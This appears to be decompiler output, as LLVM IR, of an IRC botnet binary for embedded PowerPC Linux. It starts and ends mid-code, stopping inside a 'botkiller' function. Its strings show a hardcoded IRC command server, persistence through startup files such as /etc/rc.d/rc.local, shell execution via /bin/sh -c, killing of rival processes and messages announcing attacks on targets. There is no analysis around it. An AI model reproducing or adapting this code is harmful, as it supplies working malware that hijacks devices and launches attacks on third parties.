i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b3a0.131, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b3ac.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b3b4.133, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b3bc.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b3c8.135, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b3d4.136, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b3e0.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b3ec.138, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b3f4.139, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b3fc.140, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b408.141, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b414.142, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b420.143, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b42c.144, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b434.145, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1000b440.146, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b450.147, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b458.148, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b460.149, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1000b46c.150, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b478.151, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b484.152, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b494.153, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b4a4.154, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b4b4.155, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b4c4.156, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b4d0.157, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b4dc.158, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1000b4ec.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b4fc.160, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b50c.161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b51c.162, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1000b528.163, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1000b538.164, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b54c.165, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1000b558.166, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1000b564.167, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1000b574.168, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b584.169, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000af74.30, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b590.170, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b59c.171, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5a4.172, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5ac.173, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5b4.174, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5bc.175, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5c4.176, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5cc.177, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5d4.178, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b5dc.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5e4.180, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5ec.181, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5f4.182, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b5fc.183, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b604.184, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b60c.185, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b614.186, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b61c.187, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b624.188, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b62c.189, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b634.190, i32 0, i32 0), i8* bitcast (i32* @global_var_1000b63c.191 to i8*), i8* bitcast (i32* @global_var_1000b640.192 to i8*), i8* bitcast (i32* @global_var_1000b644.193 to i8*), i8* bitcast (i32* @global_var_1000b648.194 to i8*), i8* bitcast (i32* @global_var_1000b64c.195 to i8*), i8* bitcast (i32* @global_var_1000b650.196 to i8*), i8* bitcast (i32* @global_var_1000b654.197 to i8*), i8* bitcast (i32* @global_var_1000b658.198 to i8*), i8* bitcast (i32* @global_var_1000b65c.199 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b660.200, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b664.201, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b668.202, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b66c.203, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b670.204, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b674.205, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b678.206, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b67c.207, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b680.208, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b684.209, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b688.210, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b68c.211, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1000b690.212, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b69c.213, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b6a4.214, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b6ac.215, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6b4.216, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6b8.217, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6bc.218, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6c0.219, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6c4.220, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6c8.221, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6cc.222, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6d0.223, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1000b6d4.224, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6d8.225, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6dc.226, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6e0.227, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6e4.228, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6e8.229, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6ec.230, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6f0.231, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6f4.232, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b6f8.233, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b6fc.234, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b708.235, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b710.236, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b718.237, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b720.238, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b728.239, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b730.240, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b738.241, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b740.242, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b748.243, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b754.244, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b75c.245, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b764.246, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1000b770.247, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b778.248, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b780.249, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b788.250, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b790.251, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1000b798.252, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b7a0.253, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1000b7a8.254, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b7b4.255, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1000b7bc.256, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1000b870.257, i32 0, i32 0)]
@global_var_1001d8cc.262 = global i32 0
@global_var_1001d838.263 = global i32 0
@global_var_1001d834.265 = local_unnamed_addr global i32 0
@global_var_1001d860.266 = local_unnamed_addr global i32 0
@global_var_1000b7fc.267 = constant [16 x i8] c"/usr/dict/words\00"
@global_var_1000b80c.268 = constant i32 1912602624
@global_var_1001d83c.269 = local_unnamed_addr global i32 0
@global_var_1000b810.270 = constant [25 x i8] c"%s : USERID : UNIX : %s\0A\00"
@global_var_10000e4c.271 = constant [3 x i8] c"8`\00"
@global_var_10000ea4.272 = constant [3 x i8] c"8`\00"
@global_var_1000b82c.273 = constant [4 x i8] c"std\00"
@global_var_10000fd8.274 = constant [3 x i8] c"8`\00"
@global_var_10001004.275 = constant [3 x i8] c"8`\00"
@global_var_1000100c.276 = constant i32 939524096
@global_var_1001d85c.277 = local_unnamed_addr global i32 0
@global_var_1000b830.278 = constant [29 x i8] c"PRIVMSG %s :Killing pid %d.\0A\00"
@global_var_1000b850.279 = constant [30 x i8] c"PRIVMSG %s :[UNK]Hitting %s!\0A\00"
@global_var_1000127c.280 = constant i32 1207979573
@global_var_1000134c.281 = constant [3 x i8] c"8`\00"
@global_var_1000b7f4.282 = constant [6 x i8] c"pices\00"
@global_var_1000bab4.283 = constant i32 1
@global_var_1001d57c.286 = global i32 34603008
@global_var_1001d7e4.287 = local_unnamed_addr global [9 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1000b7f4.282, i32 0, i32 0), i8* bitcast (i32* @global_var_1000bab4.283 to i8*), i8* bitcast (i32* @global_var_1000bab4.283 to i8*), i8* bitcast (i16* @global_var_1001d4dc.284 to i8*), i8* bitcast (i16* @global_var_1001d52c.285 to i8*), i8* bitcast (i32* @global_var_1001d57c.286 to i8*), i8* bitcast (i16* @global_var_1001d4dc.284 to i8*), i8* bitcast (i16* @global_var_1001d52c.285 to i8*), i8* bitcast (i16* @global_var_1001d4dc.284 to i8*)]
@global_var_10001534.288 = constant i32 939524096
@global_var_1001d844.289 = local_unnamed_addr global i32 0
@global_var_1000b8b4.290 = constant i32 0
@global_var_1001d44c.291 = global [4 x i8]* @global_var_1000b870.257
@global_var_100018c8.292 = constant i32 939524097
@global_var_1000b8b8.293 = constant [15 x i8] c"MODE %s +pixB\0A\00"
@global_var_1001d858.294 = local_unnamed_addr global i32 0
@global_var_1000b8c8.295 = constant [13 x i8] c"JOIN %s :%s\0A\00"
@global_var_1000b8d8.296 = constant [8 x i8] c"WHO %s\0A\00"
@global_var_1000b8e0.297 = constant [9 x i8] c"PONG %s\0A\00"
@global_var_1001d830.298 = local_unnamed_addr global i32 0
@global_var_1000b8ec.303 = constant [22 x i8] c"[linux][powerpc440fp]\00"
@global_var_1001d848.304 = local_unnamed_addr global i32 0
@global_var_1001d824.305 = local_unnamed_addr global i32 0
@global_var_1001d7d8.306 = local_unnamed_addr global i32 1
@global_var_1000b7dc.307 = constant [22 x i8] c"irc.picesthegoatgg.ml\00"
@global_var_1001d7dc.308 = global [22 x i8]* @global_var_1000b7dc.307
@global_var_1001d850.309 = local_unnamed_addr global i32 0
@global_var_10001f90.310 = constant i32 1207959580
@global_var_10001fe8.311 = constant [3 x i8] c"8`\00"
@global_var_100020a8.312 = constant i32 1207959668
@global_var_100020dc.313 = constant [3 x i8] c"8`\00"
@global_var_1000b924.314 = constant [19 x i8] c"/etc/rc.d/rc.local\00"
@global_var_1000b938.315 = constant [13 x i8] c"/etc/rc.conf\00"
@global_var_1000b948.316 = constant i32 788529152
@global_var_1000b94c.317 = constant [8 x i8] c"\22%s%s\22\0A\00"
@global_var_10002274.318 = constant i32 1207959620
@global_var_1000b954.319 = constant i32 1627389952
@global_var_1000231c.320 = constant i32 1207959576
@global_var_10002328.321 = constant i32 1207959564
@global_var_10002334.322 = constant i32 1207961793
@global_var_1000b958.323 = constant [14 x i8] c"/usr/bin/sshd\00"
@global_var_1000237c.324 = constant i32 939524097
@global_var_1001d84c.325 = local_unnamed_addr global i32 0
@global_var_1000b968.326 = constant i32 587202560
@global_var_1000b96c.327 = constant i32 0
@global_var_1001d840.328 = local_unnamed_addr global i32 0
@global_var_1000b970.329 = constant [9 x i8] c"PASS %s\0A\00"
@global_var_1000b97c.330 = constant [41 x i8] c"NICK %s\0AUSER %s localhost localhost :%s\0A\00"
@global_var_10002530.331 = constant i32 1207959556
@global_var_1000b9a8.332 = constant i32 167772160
@global_var_10002918.333 = constant i32 1207959568
@global_var_100029c0.334 = constant i32 939524096
@global_var_1000b904.335 = constant [4 x i8] c"352\00"
@global_var_1001d474.336 = global [4 x i8]* @global_var_1000b904.335
@global_var_1000b9ac.337 = constant [6 x i8] c"ERROR\00"
@global_var_10002b44.338 = constant i32 1207959564
@global_var_10002d1c.339 = constant i32 1207959560
@global_var_1001d87c.340 = local_unnamed_addr global i32 0
@global_var_1001d88c.341 = global i32 0
@global_var_10006d24.342 = constant [3 x i8] c"8`\00"
@global_var_1001d4c4.343 = global i32 0
@global_var_1001d864.344 = local_unnamed_addr global i32 0
@global_var_1001d868.345 = local_unnamed_addr global i32 0
@global_var_1000306c.346 = constant i32 1207965641
@global_var_10003240.347 = constant i32 939524118
@global_var_10003264.348 = constant i32 1207960124
@global_var_1001d808.349 = local_unnamed_addr global i32 2
@global_var_1001d4ac.350 = global i32 0
@global_var_1001d804.351 = global i32* bitcast (i16* @global_var_1001d4dc.284 to i32*)
@global_var_1000349c.352 = constant i32 1207959560
@global_var_100034ec.353 = constant [3 x i8] c" c\00"
@global_var_10003508.354 = constant [3 x i8] c" c\00"
@global_var_1000bcb4.355 = constant i32 0
@global_var_100037a4.356 = constant i32 1207961084
@global_var_100038cc.357 = constant i32 1207960764
@global_var_1000bce8.358 = constant i32 269488136
@global_var_1000bccc.359 = constant [6 x i8] c"(nil)\00"
@global_var_1000bcd4.360 = constant [7 x i8] c"(null)\00"
@global_var_1000bcdc.361 = constant i32 721431808
@global_var_10003d28.362 = constant i32 939524096
@global_var_1000bd68.363 = constant i32 65793
@global_var_1000bd50.364 = constant i32 524293
@global_var_1001d818 = external local_unnamed_addr global i32
@global_var_1000cd22.366 = constant i32 1
@global_var_1000bd48.367 = constant [8 x i8] c" +0-#'I\00"
@global_var_1000bcf0.368 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1000bd30.369 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1000bd24.370 = constant i32 67343
@global_var_1000bd23.371 = constant i32 50331911
@global_var_1000bd14.372 = constant i32 268435461
@global_var_1000bd04.373 = constant i32 520093701
@global_var_100046e0.374 = constant [3 x i8] c"8a\00"
@global_var_10004a08.375 = constant i32 1207959708
@global_var_10004ab0.376 = constant i32 1207959612
@global_var_10004bfc.377 = constant i32 939589631
@global_var_10004cb0.378 = constant i32 939524118
@global_var_1000bd84.379 = constant [8 x i8] c"Success\00"
@global_var_1000bd74.380 = constant [15 x i8] c"Unknown error \00"
@global_var_1001d820.381 = local_unnamed_addr global i32* @global_var_1000cd22.366
@global_var_1001d86c.382 = global i32 0
@global_var_1001fe98.383 = global i32 0
@global_var_1001fccc.384 = global i32 0
@global_var_1001d7a8.385 = global i32 0
@global_var_1001d898.386 = local_unnamed_addr global i32 0
@global_var_1001ff04.387 = global i32 0
@global_var_10005744.388 = constant [3 x i8] c"8`\00"
@global_var_10005828.389 = constant i32 939524098
@global_var_10005868.390 = constant [3 x i8] c"8`\00"
@global_var_1001feac.391 = global i32 0
@global_var_1001d80c = external global i32
@global_var_1001fedc.394 = global i32 0
@global_var_10005bac.395 = constant i32 939524108
@global_var_10005c44.396 = constant [3 x i8] c"8`\00"
@global_var_10005cf0.397 = constant [3 x i8] c"8`\00"
@global_var_10006018.398 = constant i32 1207959640
@global_var_10006054.399 = constant i32 1207959580
@global_var_1001d6d8.400 = global i32 0
@global_var_1001d6f0 = external global i32
@global_var_1001d710.402 = global i32 -1726662223
@global_var_1001d6f8.403 = local_unnamed_addr global i32* @global_var_1001d710.402
@global_var_1001d6f4.404 = global i32* @global_var_1001d710.402
@global_var_1000c8e0.405 = constant i32 0
@global_var_1000636c.406 = constant i32 939524118
@global_var_10006590.407 = constant i32 939524096
@global_var_1000c908.408 = constant [8 x i8] c"/bin/sh\00"
@global_var_1000c910.409 = constant [3 x i8] c"sh\00"
@global_var_1000c914.410 = constant [3 x i8] c"-c\00"
@global_var_100066c0.411 = constant [3 x i8] c"8`\00"
@global_var_100068d4.412 = constant i32 939524130
@global_var_1001d78c.413 = global i32 0
@global_var_1001d870.414 = local_unnamed_addr global i32 0
@global_var_10006968.415 = constant i32 1207960361
@global_var_1001d878.416 = local_unnamed_addr global i32 0
@global_var_1001d054.417 = global i32 -1
@global_var_1001d880.418 = local_unnamed_addr global i32 0
@global_var_1001d884.419 = local_unnamed_addr global i32 0
@global_var_1000c918.420 = constant [10 x i8] c"/dev/null\00"
@global_var_1001d888.421 = local_unnamed_addr global i32 0
@global_var_1001d874.422 = local_unnamed_addr global i32 0
@global_var_1000703c.423 = constant i32 939524096
@global_var_10007058.424 = constant i32 939524096
@global_var_1000707c.425 = constant i32 939524285
@global_var_1001d8ac.426 = local_unnamed_addr global i32 0
@global_var_100074dc.427 = constant i32 939524118
@global_var_1001d890.428 = global i32 0
@global_var_1000761c.429 = constant i32 939524180
@global_var_10007938.430 = constant i32 939524105
@global_var_1000cf50.431 = constant [4 x i8] c"inf\00"
@global_var_1000cf53.433 = constant i32 4804166
@global_var_1000cf60.434 = constant i32 771763200
@global_var_1001fec4.436 = global i32 0
@global_var_1001d894.437 = local_unnamed_addr global i32 0
@global_var_100088f0.439 = constant i32 1207960848
@global_var_1001d89c.440 = local_unnamed_addr global i32 0
@global_var_1000cfb0.441 = constant i32 771751936
@global_var_1001fef4.442 = global i32 0
@global_var_100089e0.443 = constant [3 x i8] c"8a\00"
@global_var_100089ec.444 = constant i32 939524097
@global_var_10008ac0.445 = constant i32 939524097
@global_var_10008b94.446 = constant i32 939524097
@global_var_10008bc0.447 = constant i32 939524100
@global_var_10008ca0.448 = constant i32 1207959684
@global_var_10008e1c.449 = constant i32 939589631
@global_var_1000cfcc.450 = constant i32 1912602624
@global_var_1000cfb8.451 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_1000cfd0.452 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_1000cfe8.453 = constant [11 x i8] c"nameserver\00"
@global_var_1000cff4.454 = constant [7 x i8] c"domain\00"
@global_var_1000cffc.455 = constant [7 x i8] c"search\00"
@global_var_10009154.456 = constant i32 1207959568
@global_var_1000915c.457 = constant i32 939524099
@global_var_100092d0.458 = constant i32 939524118
@global_var_1001ff10.459 = global i32 0
@global_var_1001d7c0.460 = global i32 0
@global_var_10009418.461 = constant i32 939524129
@global_var_1001d8a0.462 = local_unnamed_addr global i32 0
@global_var_10009488.463 = constant [3 x i8] c"8`\00"
@global_var_100094c0.464 = constant i32 939524129
@global_var_1001d8a4.465 = local_unnamed_addr global i32 0
@global_var_1001d8a8.466 = local_unnamed_addr global i32 0
@global_var_100098d0.467 = constant i32 939524171
@global_var_10009980.468 = constant i32 939524105
@global_var_10009d1c.469 = constant [3 x i8] c"8`\00"
@global_var_1000d018.470 = constant [17 x i8] c"0123456789abcdef\00"
@global_var_10009f14.471 = constant [3 x i8] c"9 \00"
@global_var_10009f20.472 = constant i32 939524193
@global_var_10009f88.474 = constant i32 939524101
@global_var_1000a074.475 = constant i32 939524124
@global_var_1000a0ec.476 = constant i32 1207960116
@global_var_1000a104.477 = constant i32 939524105
@global_var_1000a27c.478 = constant [3 x i8] c"9 \00"
@global_var_1000d02c.479 = constant [3 x i8] c"%x\00"
@global_var_1000a308.480 = constant i32 939524124
@global_var_1000a32c.481 = constant i32 939524193
@global_var_1000d030.482 = constant [11 x i8] c"/etc/hosts\00"
@global_var_1000d03c.483 = constant [18 x i8] c"/etc/config/hosts\00"
@global_var_1000aa18.484 = constant i32 1207959560
@global_var_1000aab0.485 = constant i32 939589631
@global_var_1001d058.486 = global i32 0
@global_var_1001d8b0.2 = local_unnamed_addr global i8 0
@global_var_1001d828.264 = local_unnamed_addr global i8 0
@global_var_1001d4dc.284 = global i16 288
@global_var_1001d52c.285 = global i16 272
@global_var_1001d82c.299 = external local_unnamed_addr global i8*
@global_var_1001d82f.300 = external local_unnamed_addr global i8*
@global_var_1001d82e.301 = external local_unnamed_addr global i8*
@global_var_1001d82d.302 = external global i8*
@global_var_1001d7a4.438 = local_unnamed_addr global i16 1

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @frame_dummy()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @__do_global_ctors_aux(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1001d8b0.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
  br i1 %v3_100000d4, label %dec_label_pc_100000dc, label %dec_label_pc_10000134

dec_label_pc_100000dc:                            ; preds = %entry
  %v3_100000e0 = load i32, i32* bitcast (i32** @global_var_1001d06c.4 to i32*), align 4
  %v3_100000e8 = icmp eq i32 %v3_100000e0, 0
  br i1 %v3_100000e8, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_100000f0:                            ; preds = %dec_label_pc_100000dc, %dec_label_pc_100000f0
  %v0_100000f4 = phi i32 [ %v3_10000100, %dec_label_pc_100000f0 ], [ %v3_100000e0, %dec_label_pc_100000dc ]
  %v1_100000f0 = add i32 %v0_100000f4, 4
  store i32 %v1_100000f0, i32* bitcast (i32** @global_var_1001d06c.4 to i32*), align 4
  call void @__pseudo_call(i32 %v0_100000f4)
  %v3_10000100 = load i32, i32* bitcast (i32** @global_var_1001d06c.4 to i32*), align 4
  %v3_10000108 = icmp eq i32 %v3_10000100, 0
  br i1 %v3_10000108, label %dec_label_pc_10000110, label %dec_label_pc_100000f0

dec_label_pc_10000110:                            ; preds = %dec_label_pc_100000f0, %dec_label_pc_100000dc
  store i8 1, i8* @global_var_1001d8b0.2, align 1
  br label %dec_label_pc_10000134

dec_label_pc_10000134:                            ; preds = %entry, %dec_label_pc_10000110
  ret i32 undef

; uselistorder directives
  uselistorder i32 %v3_10000100, { 1, 0 }
  uselistorder i8* @global_var_1001d8b0.2, { 1, 0 }
  uselistorder label %dec_label_pc_10000134, { 1, 0 }
  uselistorder label %dec_label_pc_100000f0, { 1, 0 }
}

define i32 @call___do_global_dtors_aux() local_unnamed_addr {
entry:
  %v0_10000164 = load i32, i32* @r3, align 4
  ret i32 %v0_10000164
}

define i32 @frame_dummy() local_unnamed_addr {
entry:
  %v3_100001a0 = load i32, i32* @global_var_1001d064.8, align 4
  %v3_100001ac = icmp eq i32 %v3_100001a0, 0
  br i1 %v3_100001ac, label %dec_label_pc_100001c4, label %dec_label_pc_100001b4

dec_label_pc_100001b4:                            ; preds = %entry
  br label %dec_label_pc_100001c4

dec_label_pc_100001c4:                            ; preds = %dec_label_pc_100001b4, %entry
  ret i32 ptrtoint (i32* @global_var_1001d064.8 to i32)
}

define i32 @call_frame_dummy() local_unnamed_addr {
entry:
  %v0_100001ec = load i32, i32* @r3, align 4
  ret i32 %v0_100001ec
}

define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_0, align 4
  %v0_100001f4 = load i32, i32* @r1, align 4
  %v1_100001f4 = call i32 @__asm_rlwinm(i32 %v0_100001f4, i32 0, i32 0, i32 27)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000204 = add i32 %v1_100001f4, -16
  %v3_10000204 = inttoptr i32 %v2_10000204 to i32*
  store i32 %v1_100001f4, i32* %v3_10000204, align 4
  %v0_10000208 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10000208, i32* %v3_10000204, align 4
  %v2_10000210 = load i32, i32* %stack_var_0, align 4
  %v7_10000234 = call i32 @__uClibc_main(i32 268443956, i32 %v2_10000210, i32* nonnull %stack_var_4, i32 268435604, i32 268480196, i32 %arg1)
  ret i32 %v7_10000234

; uselistorder directives
  uselistorder i32 %v1_100001f4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
}

define i32 @botkiller(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-100 = alloca i8*, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10000238 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10000238, i32* %stack_var_-112, align 4
  %v5_10000238 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v5_10000238, i32* @r31, align 4
  %v2_10000258 = ptrtoint i8** %stack_var_-100 to i32
